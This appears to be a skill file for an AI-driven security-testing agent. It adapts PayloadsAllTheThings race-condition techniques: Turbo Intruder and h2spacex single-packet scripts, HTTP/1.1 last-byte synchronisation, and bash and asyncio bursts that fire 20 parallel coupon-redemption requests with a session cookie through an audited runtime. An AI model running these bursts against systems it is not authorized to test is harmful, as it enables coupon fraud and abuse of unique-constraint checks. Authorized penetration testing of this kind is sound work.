---
description: HTTP/2 single-packet, HTTP/1.1 last-byte sync, Turbo-Intruder-style gating, h2spacex, audited in-runtime burst recipes
skill: race-condition-testing
source: PayloadsAllTheThings — Race Condition
source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
source_license: MIT; see THIRD_PARTY_NOTICES.md
---

# Race Condition Payloads

> Source: PayloadsAllTheThings — Race Condition

## HTTP/2 Single-Packet Attack

Send 20-30 requests simultaneously in a single TCP packet, ensuring they arrive at the server at the exact same time.

### Turbo Intruder (Burp Extension)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.HTTP2)

    # Queue all requests with a gate
    for i in range(30):
        engine.queue(target.req, gate='race1')

    # Release all at once
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### h2spacex (Python)

```python
from h2spacex import H2OnePkt

h2_conn = H2OnePkt('https://target.example', len(requests))
for req in requests:
    h2_conn.send(req)
h2_conn.perform()
```

## HTTP/1.1 Last-Byte Synchronization

For servers that don't support HTTP/2:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=1,
                           pipeline=False)

    for i in range(30):
        engine.queue(target.req, gate='race1')

    # This holds back the last byte of each request
    # then releases them all simultaneously
    engine.openGate('race1')
```

## Common Attack Scenarios

- [ ] Account creation with unique constraints (email, username)

## Running a burst through the audit pipeline

Target traffic goes through one `vigil assess kali exec` call; the parallelism lives inside the
runtime command, never as backgrounded host-side curls:

```bash
vigil assess kali exec --technique RACE-CONDITION --probe-kind payload --identity-env A=user_a \
  --intent "20-way redeem burst (wide window)" --phase consume-test --timeout 120 -- bash -c '
seq 1 20 | xargs -P 20 -I{} curl -s -o /dev/null -w "%{http_code}\n" -X POST \
  -b "$VIGIL_COOKIE_A" -H "Content-Type: application/json" \
  -d "{\"code\":\"COUPON\"}" https://target.example/api/redeem | sort | uniq -c'
```

A curl/xargs burst spreads requests over milliseconds; it finds wide windows only. A negative from
it is not conclusive: use the HTTP/2 single-packet or HTTP/1.1 last-byte technique above (h2spacex
or a Turbo-Intruder-style gate) before closing the lead.

Prepare N identical requests via curl config file (runtime curl, HTTP/2 multiplexing):

```bash
vigil assess kali exec --technique RACE-CONDITION --probe-kind payload --identity-env A=user_a \
  --intent "20-way HTTP/2 multiplexed redeem burst" --phase consume-test --timeout 120 -- bash -c '
# Create config file with 20 parallel POST requests
for i in $(seq 1 20); do
  echo "url = https://target/redeem-coupon"
  echo "request = POST"
  echo "data = code=DISCOUNT50"
  echo "cookie = \"$VIGIL_COOKIE_A\""
  echo "next"
done > /tmp/race_config.txt

# Send all simultaneously via HTTP/2 multiplexing
curl --parallel --parallel-max 20 -K /tmp/race_config.txt -o /dev/null -w "%{http_code}\n"'
```

Alternative: Python asyncio for precise timing (the runtime ships `python3-aiohttp`; run it as a
probe script through `vigil assess kali exec … -- python3 <script>`,
`agent/skills/write-probe-script/SKILL.md`):

```python
import asyncio, aiohttp
async def race():
    async with aiohttp.ClientSession() as s:
        tasks = [s.post('https://target/redeem-coupon', data={'code':'DISCOUNT50'}) for _ in range(20)]
        return await asyncio.gather(*tasks)
asyncio.run(race())
```
